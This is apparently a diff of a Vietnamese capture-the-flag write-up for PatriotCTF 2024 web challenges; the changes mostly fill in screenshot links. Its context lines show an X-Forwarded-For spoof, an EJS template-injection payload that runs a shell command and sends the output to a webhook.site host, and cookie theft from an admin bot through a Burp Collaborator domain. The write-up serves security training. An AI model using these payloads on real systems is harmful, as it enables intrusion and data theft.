@@ -4,7 +4,7 @@
 
 Trang web hiển thị giao diện như hình bên dưới
 
-![img1]()
+![img1](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-01.png?raw=true)
 
 Trang web được cung cấp source tôi chú ý đến đoạn code `php` này
 
@@ -24,7 +24,7 @@ if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && in_array($_SERVER['HTTP_X_FORWARD
 
 Vì vậy tôi sẽ sử dụng thêm `header` `X-Forwarded-For: 127.0.0.1` - là một `HTTP header` được sử dụng để ghi lại địa chỉ IP ban đầu của client khi một yêu cầu HTTP được gửi qua `proxy` hoặc `load balancer`, ở đây nó sẽ mang giá trị `127.0.0.1`
 
-![img2]()
+![img2](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-02.png?raw=true)
 
 > Flag: CACI{1_lik3_g1raff3s_4_l0t}
 
@@ -32,7 +32,7 @@ Vì vậy tôi sẽ sử dụng thêm `header` `X-Forwarded-For: 127.0.0.1` - l�
 
 Đây là giao diện của trang thử thách
 
-![img5]()
+![img5](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-05.png?raw=true)
 
 Thử thách vẫn cho ta một đoạn code `js` như sau:
 
@@ -63,7 +63,7 @@ Vì vậy tôi sẽ thực thi `payload` nhằm lấy nội dung của file `fla
 http://chal.competitivecyber.club:3000/?settings[view%20options][outputFunctionName]=x%0Afetch(%60https://webhook.site/5974a063-c2a8-4009-8b57-a04f8a165d36?flag=$%7Bprocess.mainModule.require(%27child_process%27).execSync(%27cat%20flag.txt%27).toString()%7D%60)%0As
 ```
 
-![img-06]()
+![img-06](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-06.png?raw=true)
 
 > outputFunctionName is not a valid JS identifier
 
@@ -83,7 +83,7 @@ http://chal.competitivecyber.club:3000/?settings[view%20options][client]=true&se
 
 Trang web hiển thị giao diện như hình bên dưới
 
-![img3]()
+![img3](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-03.png?raw=true)
 
 Trang web yêu cầu nhập vào một path thuộc địa chỉ ip `127.0.0.1` với `port` đang mở là `13337` có thể liên quan đến lỗ hổng `XSS` , `SSRF`
 
@@ -137,7 +137,7 @@ Vì trang web sử dụng `admin bot` để xác thực nên tôi đọc tiếp 
 
 Ở đoạn code này server xử lí khi URL có chứa `cal` hoặc `%` thì sẽ trả về `'Error: "cal" is not allowed in the URL'`, bằng chứng là khi tôi test thử như sau:
 
-![img4]()
+![img4](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-04.png?raw=true)
 
 Vậy thì chúng ta không thể `inject` thông qua `/api/cal` vì sẽ được `server` kiểm tra và không thể thực thi, tôi nghĩ đến tấn công vào `api` là `/api/stats` với 2 trường tham số bổ sung là `username` và `high_score` sau đó `server` sẽ xử lí và trả về `id`, sau đó yêu cầu `admin bot` truy cập đến `/api/stats/id` để lấy data tương ứng với `id` này
 
@@ -163,9 +163,10 @@ Vậy thì chúng ta không thể `inject` thông qua `/api/cal` vì sẽ đư�
 
 - Tôi test thử chức năng tạo ra một `id` mới, gửi request đến /api/stats với các trường `username` và `high_score` bổ sung
 
-  ![img07]()
+  ![img07](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-07.png?raw=true)
 
 - Bây giờ tôi sẽ sử dụng `Burp Collaborator`,một cách đơn giản, `Burp Collaborator` là một máy chủ có thể nhận yêu cầu qua nhiều giao thức (ví dụ: HTTP, HTTPS, DNS hoặc SMTP). Nó cho phép phát hiện các lỗ hổng không biểu hiện trong các phản hồi trực tiếp nhận được từ ứng dụng mục tiêu mà thay vào đó xuất hiện trong các kết nối do ứng dụng khởi tạo với các hệ thống khác, đó là lý do tại sao chúng được gọi là lỗ hổng ngoài băng tần(`out-of-band`)
+
   ```
   mukf2yv9x6l6hzto5team5bjkaq1es2h.oastify.com
   http://mukf2yv9x6l6hzto5team5bjkaq1es2h.oastify.com
@@ -180,18 +181,17 @@ Vậy thì chúng ta không thể `inject` thông qua `/api/cal` vì sẽ đư�
 
 - Tôi gửi request đến `/api/stats` với `payload` trên, sau đó đi đến `/api/stats` với `id` mới được thêm mới:
 
-  ![img10]()
+  ![img10](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-10.png?raw=true)
 
-  ![img11]()
+  ![img11](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-11.png?raw=true)
 
 - Sau đó, bot truy cập UUID:
 
-  ![img12]()
+  ![img12](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-12.png?raw=true)
 
 - Kiểm tra tham số data được gắn kèm trên URL của request `Burp Collaborator` sẽ thấy được cookie trả về
 
-  ![img13]()
-
+  ![img13](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-13.png?raw=true)
 
   ```
   {"cal": "   September 2024
@@ -205,12 +205,10 @@ Vậy thì chúng ta không thể `inject` thông qua `/api/cal` vì sẽ đư�
   FDJtFLydO3dojOCrKj1mJiN0NYJW2OLx4rRUZCp5gMxi6wTszhb7NkC7idQ1E1J9WCbU0zOujetQbkIuhSNUf9uwsdOi5vlnz0ngid0ifXfoe78PA3D7KM1LpKnr6iLp"}
   ```
 
-
 - Gửi kèm cookie đó để lấy `flag`
 
-  ![img15]()
+  ![img15](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PatriotCTF-2024/web/images/image-15.png?raw=true)
 
 > Flag: CACI{1_l0v3_c0mm4nd_1nj3ct10n}
 
 ## Impersonate
-
